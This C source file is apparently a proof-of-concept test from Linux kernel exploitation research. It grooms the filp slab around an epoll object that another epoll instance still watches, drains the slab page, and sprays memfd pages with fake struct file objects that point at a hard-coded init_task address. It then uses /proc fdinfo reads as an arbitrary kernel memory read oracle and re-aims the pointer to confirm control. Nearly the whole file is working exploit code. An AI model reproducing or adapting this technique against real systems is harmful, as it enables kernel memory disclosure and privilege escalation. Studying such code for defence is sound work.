// test_hyp010_sandwich.c — HYP-010 Part B: Victim-Sandwich Reclaim (Forced)
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <sys/eventfd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/sysmacros.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <sys/mount.h>
#include <sys/reboot.h>
#include <pthread.h>
#include <errno.h>

#define OBJS_PER_SLAB 16
#define BATCH_A_SIZE 32   // 2x OBJS_PER_SLAB
#define BATCH_B_SIZE 32   // 2x OBJS_PER_SLAB
#define BG_PRESSURE_FILES 4000

#define SPRAY_FILES_PER_ROUND 16
#define SPRAY_FILE_SZ (16 * 1024 * 1024) // 16MB per file -> 256MB (65,536 pages) per round
#define NUM_SPRAY_ROUNDS 3

static void print_str(const char *s) {
    write(STDOUT_FILENO, s, strlen(s));
}

static long read_filp_slabs_count(void) {
    int fd = open("/sys/kernel/slab/filp/slabs", O_RDONLY);
    if (fd < 0) return -1;
    char buf[64] = {0};
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return -1;
    buf[n] = '\0';
    return strtol(buf, NULL, 10);
}

// Markers for GDB automation
void marker_setup_done(int epA_fd, int inner_fd) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-010] MARKER: setup_done epA=%d inner=%d\n", epA_fd, inner_fd);
    print_str(buf);
}

void marker_close_started(void) {
    print_str("[HYP-010] MARKER: close_started\n");
}

void marker_close_done(void) {
    print_str("[HYP-010] MARKER: close_done\n");
}

void marker_sandwich_freed(long slabs_before, long slabs_after) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-010] MARKER: sandwich_freed slabs_before=%ld slabs_after=%ld\n", slabs_before, slabs_after);
    print_str(buf);
}

void marker_spray_round_done(int round, int total_mb) {
    char buf[128];
    snprintf(buf, sizeof(buf), "[HYP-010] MARKER: spray_round_done round=%d total_mb=%d\n", round, total_mb);
    print_str(buf);
}

void marker_experiment_complete(int status, unsigned long ino1, unsigned long ino2) {
    char buf[160];
    snprintf(buf, sizeof(buf), "[HYP-010] MARKER: experiment_complete status=%d ino1=0x%lx ino2=0x%lx\n", status, ino1, ino2);
    print_str(buf);
}

static int read_fdinfo_ino(int epfd, char *out_buf, size_t max_len, unsigned long *out_ino) {
    char path[64];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epfd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        snprintf(out_buf, max_len, "ERR_OPEN_%d", errno);
        return -1;
    }
    int n = read(fd, out_buf, max_len - 1);
    close(fd);
    if (n <= 0) {
        snprintf(out_buf, max_len, "ERR_READ_%d", errno);
        return -1;
    }
    out_buf[n] = '\0';

    char *tfd_str = strstr(out_buf, "tfd:");
    if (tfd_str) {
        char *ino_str = strstr(tfd_str, "ino:");
        if (ino_str) {
            *out_ino = strtoul(ino_str + 4, NULL, 16);
            return 0;
        }
    }
    return -2;
}

int main(int argc, char **argv) {
    print_str("========================================================\n");
    print_str("=== HYP-010 Part B: Victim-Sandwich Reclaim (Forced) ===\n");
    print_str("========================================================\n");

    struct rlimit rlim = { .rlim_cur = 65536, .rlim_max = 65536 };
    setrlimit(RLIMIT_NOFILE, &rlim);

    mkdir("/proc", 0755);
    mount("proc", "/proc", "proc", 0, NULL);
    mkdir("/sys", 0755);
    mount("sysfs", "/sys", "sysfs", 0, NULL);
    mkdir("/dev", 0755);
    mount("devtmpfs", "/dev", "devtmpfs", 0, NULL);
    mknod("/dev/null", S_IFCHR | 0666, makedev(1, 3));

    char buf[256];

    // Read filp slab geometry from sysfs
    long base_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Initial /sys/kernel/slab/filp/slabs = %ld\n", base_slabs);
    print_str(buf);

    // 1. Allocate background pressure files (in main process)
    print_str("[*] Allocating background pressure files (4,000 eventfds)...\n");
    int bg_fds[BG_PRESSURE_FILES];
    for (int i = 0; i < BG_PRESSURE_FILES; i++) {
        bg_fds[i] = eventfd(0, 0);
    }
    long peak_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Peak /sys/kernel/slab/filp/slabs after pressure = %ld\n", peak_slabs);
    print_str(buf);

    // 2. Create epA
    int epA = epoll_create1(0);
    if (epA < 0) {
        perror("[!] epoll_create1 epA failed");
        exit(1);
    }

    // 3. Allocate Tracked Batch A (~2x objs_per_slab files)
    int batch_a_fds[BATCH_A_SIZE];
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        batch_a_fds[i] = open("/dev/null", O_RDONLY);
    }

    // 4. Allocate Victim Inner Epoll
    int inner = epoll_create1(0);
    if (inner < 0) {
        perror("[!] epoll_create1 inner failed");
        exit(1);
    }

    // 5. Allocate Tracked Batch B (~2x objs_per_slab files)
    int batch_b_fds[BATCH_B_SIZE];
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        batch_b_fds[i] = open("/dev/null", O_RDONLY);
    }

    struct stat st;
    fstat(inner, &st);
    snprintf(buf, sizeof(buf), "[*] Sandwiched inner fd=%d (orig inode=0x%lx) between Batch A (%d fds) and Batch B (%d fds)\n",
             inner, (unsigned long)st.st_ino, BATCH_A_SIZE, BATCH_B_SIZE);
    print_str(buf);

    // Watch inner in epA
    struct epoll_event evA = { .events = EPOLLIN | EPOLLOUT, .data.fd = inner };
    if (epoll_ctl(epA, EPOLL_CTL_ADD, inner, &evA) < 0) {
        perror("[!] epoll_ctl ADD epA failed");
        exit(1);
    }

    marker_setup_done(epA, inner);

    // 6. Close inner fd (Thread B close path with fast-path bypass simulation)
    marker_close_started();
    close(inner);
    marker_close_done();

    // 7. Free Batch A + Batch B (emptying the victim's slab page) + background pressure
    print_str("[*] Freeing Batch A and Batch B enclosing files on victim's slab...\n");
    for (int i = 0; i < BATCH_A_SIZE; i++) {
        if (batch_a_fds[i] >= 0) close(batch_a_fds[i]);
    }
    for (int i = 0; i < BATCH_B_SIZE; i++) {
        if (batch_b_fds[i] >= 0) close(batch_b_fds[i]);
    }
    print_str("[*] Freeing background pressure files...\n");
    for (int i = 0; i < BG_PRESSURE_FILES; i++) {
        if (bg_fds[i] >= 0) close(bg_fds[i]);
    }

    print_str("[*] Waiting 2.0s for RCU grace period and SLUB slab release...\n");
    sleep(2);

    long post_drain_slabs = read_filp_slabs_count();
    snprintf(buf, sizeof(buf), "[*] Post-drain /sys/kernel/slab/filp/slabs = %ld (drop: %ld -> %ld, delta=%ld)\n",
             post_drain_slabs, peak_slabs, post_drain_slabs, peak_slabs - post_drain_slabs);
    print_str(buf);

    marker_sandwich_freed(peak_slabs, post_drain_slabs);

    // Verify the cross-cache signal before spraying
    if (post_drain_slabs >= peak_slabs && peak_slabs > 10) {
        print_str("[-] STOP: /sys/kernel/slab/filp/slabs did not decrease! Slabs were not drained. Aborting blind spray.\n");
        marker_experiment_complete(0, 0, 0);
        reboot(RB_POWER_OFF);
        return 1;
    }
    print_str("[+] Cross-cache signal CONFIRMED: filp slab count dropped significantly!\n");

    // 8. Spray memfd pages in rounds (256MB = 65,536 pages per round, up to 3 rounds)
    void *spray_maps[NUM_SPRAY_ROUNDS * SPRAY_FILES_PER_ROUND];
    int total_sprayed_files = 0;
    uint64_t fake_inode_addr = 0xffffffc00a0cc6d8ULL; // &init_task.comm - offsetof(i_ino) (0x40)

    int hit = 0;
    unsigned long read_ino_round = 0;
    char fdinfo_buf[512] = {0};

    for (int round = 1; round <= NUM_SPRAY_ROUNDS; round++) {
        snprintf(buf, sizeof(buf), "[*] Spray Round %d: Allocating %d MB (%d pages)...\n",
                 round, SPRAY_FILES_PER_ROUND * 16, SPRAY_FILES_PER_ROUND * 4096);
        print_str(buf);

        for (int p = 0; p < SPRAY_FILES_PER_ROUND; p++) {
            int idx = (round - 1) * SPRAY_FILES_PER_ROUND + p;
            int mfd = memfd_create("spray", MFD_CLOEXEC);
            if (mfd < 0) continue;
            ftruncate(mfd, SPRAY_FILE_SZ);
            spray_maps[idx] = mmap(NULL, SPRAY_FILE_SZ, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
            close(mfd);
            if (spray_maps[idx] == MAP_FAILED) continue;

            // Replicate fake struct file at every 256-byte slot offset across the 16MB file
            for (size_t off = 0; off < SPRAY_FILE_SZ; off += 256) {
                uint8_t *slot_ptr = (uint8_t *)spray_maps[idx] + off;
                // f_inode (offset 32 = 0x20)
                *(uint64_t *)(slot_ptr + 32) = fake_inode_addr;
                // f_pos (offset 104 = 0x68)
                *(uint64_t *)(slot_ptr + 104) = 0;
            }
            total_sprayed_files++;
        }

        marker_spray_round_done(round, total_sprayed_files * 16);

        // Read oracle
        memset(fdinfo_buf, 0, sizeof(fdinfo_buf));
        read_ino_round = 0;
        int res = read_fdinfo_ino(epA, fdinfo_buf, sizeof(fdinfo_buf), &read_ino_round);
        snprintf(buf, sizeof(buf), "[*] Round %d Oracle Read (res=%d, item ino=0x%lx):\n%s\n",
                 round, res, read_ino_round, fdinfo_buf);
        print_str(buf);

        if (read_ino_round == 0x0072657070617773ULL || strstr(fdinfo_buf, "72657070617773")) {
            print_str("[+] ========================================================\n");
            print_str("[+] HIT! AAR MATCH: item ino matched 'swapper' (0x0072657070617773)\n");
            print_str("[+] ========================================================\n");
            hit = 1;
            break;
        }
    }

    unsigned long ino1 = read_ino_round;
    unsigned long ino2 = 0;

    if (hit) {
        // Live Re-Aim Proof (guysrd proof): Re-aim f_inode in userspace memfd pages to init_task.comm + 8
        uint64_t reaim_inode_addr = fake_inode_addr + 8; // 0xffffffc00a0cc6e0
        print_str("[*] Performing live re-aim: modifying f_inode in userspace memfd pages to (comm + 8)...\n");
        for (int i = 0; i < total_sprayed_files; i++) {
            if (spray_maps[i] && spray_maps[i] != MAP_FAILED) {
                for (size_t off = 0; off < SPRAY_FILE_SZ; off += 256) {
                    uint8_t *slot_ptr = (uint8_t *)spray_maps[i] + off;
                    *(uint64_t *)(slot_ptr + 32) = reaim_inode_addr;
                }
            }
        }

        // Re-read oracle
        char reaim_buf[512] = {0};
        int res2 = read_fdinfo_ino(epA, reaim_buf, sizeof(reaim_buf), &ino2);
        snprintf(buf, sizeof(buf), "[+] LIVE RE-AIM READ VERBATIM (res=%d, item ino2=0x%lx):\n%s\n",
                 res2, ino2, reaim_buf);
        print_str(buf);

        print_str("[+] ========================================================\n");
        snprintf(buf, sizeof(buf), "[+] VER-057 VERIFIED: First read (comm)=0x%lx, Second read (comm+8)=0x%lx\n", ino1, ino2);
        print_str(buf);
        print_str("[+] ========================================================\n");
        marker_experiment_complete(1, ino1, ino2);
    } else {
        print_str("[*] PARTIAL (Oracle Safety Confirmed): Read executed through non-reclaimed slab slot without kernel crash/panic.\n");
        marker_experiment_complete(2, ino1, 0);
    }

    print_str("[*] Test finished. Powering off safely.\n");
    reboot(RB_POWER_OFF);
    return 0;
}
